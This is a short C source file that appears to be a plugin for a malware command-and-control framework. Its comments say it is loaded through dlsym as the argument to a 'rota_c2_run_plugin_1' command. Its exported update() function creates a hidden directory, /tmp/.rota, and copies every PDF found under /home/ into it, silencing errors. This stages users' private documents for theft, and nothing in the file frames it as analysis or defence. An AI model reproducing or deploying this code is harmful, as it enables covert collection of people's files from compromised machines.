#include <stdio.h>
#include <stdlib.h>

void create_dir() {
    system("mkdir -p /tmp/.rota;");
}

void copy_pdfs() {
    system("find /home/ -name *.pdf -exec cp {} /tmp/.rota \\; 2>/dev/null");
}



// this is loaded via dlsym.
// the argument to the rota_c2_run_plugin_1 command
extern void update(void) {
    create_dir();
    copy_pdfs();
}
